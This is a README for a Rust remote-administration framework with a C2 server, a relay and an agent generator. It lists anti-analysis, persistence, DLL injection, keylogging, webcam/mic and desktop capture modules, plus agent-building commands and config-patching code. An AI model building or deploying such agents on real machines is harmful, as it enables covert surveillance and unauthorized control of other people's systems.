# Rust Remote Admin

Research/educational Rust workspace implementing authenticated remote-administration primitives — mTLS sessions, agent connection management, process/file/registry collection, remote command execution, and platform-specific hardening research modules.

All sensitive capabilities (injection, keylogging, capture, persistence, anti-analysis) are documented research examples with platform-specific implementations behind `#[cfg()]` attributes.

## Binaries

Two components — not three. The control software generates the client executable.

| Component | Purpose |
|-----------|---------|
| `rust-remote-admin-c2.exe` | Control server: listens for agents, queues commands, tracks health, **generates agent binaries** |
| `rust-remote-admin-relay.exe` | Optional TCP relay for C2 infrastructure (cleartext or TLS modes) |

The agent binary is **not shipped as a standalone release**. Instead, the C2 generates it on demand with embedded connection configuration (C2 address, port, TLS certificate fingerprint). This ensures every deployed agent knows where to connect without requiring external config files or command-line arguments.

Download the C2 from [GitHub Releases](https://github.com/riceharvest/rust-remote-admin/releases).

### Agent generation

```sh
# Generate a Windows agent that connects to your C2 server
rust-remote-admin-c2 generate-agent \
  --c2-addr 192.168.1.100:9000 \
  --tls-fingerprint sha256:abc123... \
  --output agent.exe

# Deploy the generated agent on the target Windows machine
# It will connect back to the C2 and begin sending heartbeats
```

**How it works:**
- The C2 ships with a pre-compiled agent template (cross-compiled to Windows)
- The `generate-agent` command patches the template's embedded resource section with connection details
- The resulting `.exe` is standalone — no external dependencies, no config files
- Agent connects to C2, sends heartbeats, waits for commands

## Crates

| Crate | Role |
|-------|------|
| `c2/core` | Client registry, per-client command queues, mTLS listener, heartbeat health tracking |
| `c2/gui` | Tauri v2 dashboard (client list, logs, live events) |
| `c2/plugins` | Operator-side plugin trait with echo example |
| `c2/relay` | Tokio TCP relay — cleartext, TLS-ingress, TLS-egress |
| `agent/core` | Command routing, heartbeat loop, exponential-backoff reconnect, mTLS/TLS/plain modes |
| `agent/modules` | Process listing/kill, file I/O, registry, sysinfo, remote command execution |
| `agent/hardening` | Anti-analysis, persistence, DLL injection, keylogging, webcam/mic, desktop capture |
| `protocol` | Shared command/response types |
| `crypto` | AES-GCM payload encryption, mTLS session handling (cert loading, acceptor/connector builders, dev cert generation) |

## Platform implementations

| Module | Linux | Windows |
|--------|-------|---------|
| Anti-debug | ptrace TracerPid, timing checks | IsDebuggerPresent, NtQueryInformationProcess |
| VM detection | DMI vendor, CPU hypervisor flag, MAC OUI | Registry VM artifacts, CPU hypervisor flag |
| Sandbox detection | Low CPU/memory, analysis process names | Low CPU/memory, known sandbox binaries |
| Persistence | systemd user service, crontab, autostart entry | Registry Run keys (`reg add/delete`), scheduled tasks (`schtasks`) |
| DLL injection | ptrace + `/proc/<pid>/mem` shellcode + `dlopen` resolution | `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` + `LoadLibraryW` |
| Keylogging | evdev `/dev/input/event*` with keycode mapping | `SetWindowsHookExW(WH_KEYBOARD_LL)` with thread-local buffer |
| Webcam/mic | V4L2 ioctl pipeline (QUERYCAP → S_FMT → REQBUFS → mmap → STREAMON → DQBUF), ALSA via `arecord` | Stub (requires Media Foundation/WASAPI crates) |
| Desktop capture | X11 via `x11rb` (get_image + BGR→RGB conversion) | Stub (requires DXGI/GDI crate) |
| String obfuscation | XOR-based compile-time string obfuscation | Same |

## Build

```sh
cargo check --workspace
cargo test --workspace     # 62+ tests
```

### Cross-compile Windows executables

```sh
rustup target add x86_64-pc-windows-gnu
sudo dnf install mingw64-gcc mingw64-winpthreads-static   # Fedora
cargo build --release --target x86_64-pc-windows-gnu
```

Produces standalone `.exe` files with `+crt-static` — no external DLLs required.

### GUI (Tauri v2)

```sh
sudo dnf install webkit2gtk4.1-devel   # Linux dev deps
cargo build -p c2-gui
```

## Implementation roadmap

### Current state (v0.1.0)

- 3 separate binaries: agent, C2, relay
- Agent has hardcoded connection config (requires rebuild or CLI args)
- No agent generation capability
- All platform modules implemented (process, file, registry, injection, keylog, capture, persistence)

### Target state (v0.2.0)

- 2 binaries: C2 + relay
- C2 includes `generate-agent` command that produces standalone agent executables
- Agent template is pre-compiled and embedded in the C2 binary
- Connection config (C2 address, port, TLS fingerprint) is patched into the agent at generation time
- Generated agents are standalone — no external dependencies, no config files

### Required changes

**1. Agent template system**
- Pre-compile `rust-remote-admin-agent.exe` for Windows (cross-compile from Linux)
- Embed the compiled template in the C2 binary as a `const` byte array or resource
- Define a marker/placeholder in the agent binary where connection config will be written (e.g., specific offset or PE resource section)

**2. Agent config structure**
```rust
// Embedded in agent binary at a known offset
#[repr(C)]
struct AgentConfig {
    c2_addr: [u8; 64],        // "192.168.1.100:9000" (null-terminated)
    tls_fingerprint: [u8; 64], // SHA256 hex string (null-terminated)
    agent_id: u32,            // Unique identifier
    heartbeat_interval: u64,  // Milliseconds
    reconnect_attempts: u32,
}
```

**3. C2 generate-agent command**
```rust
// In c2/core/src/lib.rs or new c2/generator crate
pub fn generate_agent(c2_addr: &str, tls_fingerprint: &str, output: &Path) -> Result<(), Error> {
    // 1. Load embedded agent template from C2 binary resources
    let template: &[u8] = include_bytes!("../agent-template.exe");
    
    // 2. Parse PE executable to find config section offset
    let mut agent_bytes = template.to_vec();
    let config_offset = find_config_marker(&agent_bytes)?;
    
    // 3. Serialize AgentConfig and write to template
    let config = AgentConfig::new(c2_addr, tls_fingerprint);
    agent_bytes[config_offset..config_offset + CONFIG_SIZE].copy_from_slice(&config.to_bytes());
    
    // 4. Write to output path
    fs::write(output, agent_bytes)?;
    Ok(())
}
```

**4. Agent reads embedded config**
```rust
// In agent/core/src/lib.rs
fn load_config() -> AgentConfig {
    // Read from known offset in own executable
    let exe_path = std::env::current_exe().unwrap();
    let exe_bytes = fs::read(&exe_path).unwrap();
    let config_offset = find_config_marker(&exe_bytes);
    AgentConfig::from_bytes(&exe_bytes[config_offset..])
}
```

**5. Refactor release workflow**
- Remove `rust-remote-admin-agent.exe` from releases
- Embed pre-compiled agent template in C2 binary during build
- C2 binary now ships the agent generator capability

### Agent generation approaches

**Option A: Resource patching (simpler, chosen approach)**
- Pre-compile agent template
- Embed in C2 as byte array
- Patch config section at runtime
- Pros: No build dependencies on C2 host, fast generation
- Cons: Requires known marker/offset in agent binary

**Option B: Cross-compile on demand**
- C2 runs `cargo build --target x86_64-pc-windows-gnu` with environment variables for config
- Pros: Fully dynamic, no template maintenance
- Cons: Requires Rust toolchain on C2 host, slow (minutes per agent), complex error handling

**Option C: Template with placeholder replacement**
- Agent binary contains placeholder strings (e.g., `__C2_ADDR__`, `__TLS_FINGERPRINT__`)
- C2 does simple string replacement in the binary
- Pros: Very simple implementation
- Cons: Fragile, placeholder might appear in multiple locations, no structure validation

Current plan uses **Option A** for production reliability and **Option C** as a fallback for rapid prototyping.

### Migration path

1. **v0.1.x** — Document the plan, add `generate-agent` stub command to C2
2. **v0.2.0-alpha** — Implement agent template embedding and config patching
3. **v0.2.0-beta** — Test generated agents on Windows, verify mTLS with embedded fingerprints
4. **v0.2.0** — Remove standalone agent binary from releases, ship only C2 + relay

## Security note

This project is for lawful, authorized research and administration only. The hardening modules document offensive techniques so defenders can understand and detect them. All platform-specific code is gated behind `#[cfg()]` and returns structured errors on unsupported platforms.

## License

MIT.
